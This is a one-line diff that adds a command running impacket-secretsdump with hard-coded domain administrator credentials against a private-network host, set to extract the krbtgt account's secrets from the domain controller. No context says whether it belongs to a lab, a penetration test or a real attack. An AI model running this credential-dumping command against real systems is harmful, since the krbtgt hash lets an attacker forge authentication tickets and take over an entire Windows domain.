@@ -1,0 +1,1 @@
+impacket-secretsdump corp/administrator:admin@123@192.168.65.10 -just-dc-user krbtgt
